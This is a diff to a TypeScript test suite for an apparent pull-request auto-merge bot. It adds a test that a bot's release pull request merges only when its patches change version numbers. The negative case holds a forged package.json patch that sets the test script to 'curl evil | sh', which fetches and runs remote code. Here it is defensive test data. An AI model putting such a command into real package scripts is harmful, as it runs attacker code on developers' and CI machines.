@@ -10,7 +10,7 @@ type Fake = {
   files?: string[]; checks?: Run[]; reviews?: Review[]; author?: string; required?: string[]; draft?: boolean
   activity?: { activity_type: string; actor: { login: string } | null; after?: string }[]; rules?: unknown[]; refuse?: (method: string, path: string) => number | undefined
   open?: { number: number; draft?: boolean; user: { login: string }; head: { sha: string }; base: { ref: string } }[]
-  branch?: string; labels?: string[]; repoSettings?: Record<string, boolean>; merged?: boolean
+  branch?: string; labels?: string[]; patches?: Record<string, string>; repoSettings?: Record<string, boolean>; merged?: boolean
 }
 const POLICY = '{"people":["ana"],"rules":[{"name":"High-risk paths","anyFile":["**/payments/**"],"then":"person"},{"name":"Everything else","then":"approve"}]}'
 const NOW = Date.parse('2026-11-25T12:00:00Z')
@@ -23,7 +23,7 @@ function fakeGithub(o: Fake = {}) {
   const routes: Record<string, unknown> = {
     '/repos/acme/app/pulls/7': pr,
     '/repos/acme/app/branches/main': { protected: true, protection: { required_status_checks: { contexts: o.required ?? ['build'] } } },
-    '/repos/acme/app/pulls/7/files?per_page=100&page=1': (o.files ?? ['docs/a.md']).map(filename => ({ filename, ...(o.renamedFrom && { previous_filename: o.renamedFrom }) })),
+    '/repos/acme/app/pulls/7/files?per_page=100&page=1': (o.files ?? ['docs/a.md']).map(filename => ({ filename, ...(o.renamedFrom && { previous_filename: o.renamedFrom }), ...(o.patches?.[filename] && { patch: o.patches[filename] }) })),
     [`/repos/acme/app/commits/${head}/check-runs?per_page=100&page=1`]: { check_runs: o.checks ?? [{ id: 1, name: 'build', status: 'completed', conclusion: 'success' }] },
     [`/repos/acme/app/commits/${head}/status`]: { statuses: o.statuses ?? [] },
     '/repos/acme/app/pulls/7/reviews?per_page=100&page=1': o.reviews ?? [],
@@ -461,4 +461,17 @@ test('a refused merge of a pull request another event already merged tells the o
   const gh = release({ merged: true, refuse: (m, p) => (m === 'PUT' && p.endsWith('/merge') ? 405 : undefined) }), { a, told } = setup(gh)
   await a.handle('pull_request', pushed)
   assert.equal(told.filter(t => /could not merge/.test(t)).length, 0)
+})
+
+const VERSION_RULE = '{"people":["ana","github-actions[bot]"],"rules":[{"name":"Releases","author":["github-actions[bot]"],"branch":["release-please--*"],"onlyVersionChanges":true,"then":"merge"},{"name":"Other bot pull requests","author":["github-actions[bot]"],"then":"person"},{"name":"Everything else","then":"approve"}]}'
+
+test('a bot pull request merges only when its diff moves version numbers, and goes to a person otherwise', async () => {
+  const files = ['CHANGELOG.md', 'package.json']
+  const ok = release({ orgPolicy: VERSION_RULE, files, patches: { 'CHANGELOG.md': '@@ -0,0 +1 @@\n+## 1.1.0', 'package.json': '@@ -1 +1 @@\n-  "version": "1.0.0",\n+  "version": "1.1.0",' } })
+  await setup(ok).a.handle('pull_request', pushed)
+  assert.equal(ok.merges().length, 1)
+  const forged = release({ orgPolicy: VERSION_RULE, files, patches: { 'CHANGELOG.md': '@@ -0,0 +1 @@\n+x', 'package.json': '@@ -1 +1 @@\n-  "test": "x",\n+  "test": "curl evil | sh",' } }), s = setup(forged)
+  await s.a.handle('pull_request', pushed)
+  assert.deepEqual([forged.reviews().length, forged.merges().length], [0, 0])
+  assert.match(s.told.join('\n'), /Other bot pull requests/)
 })
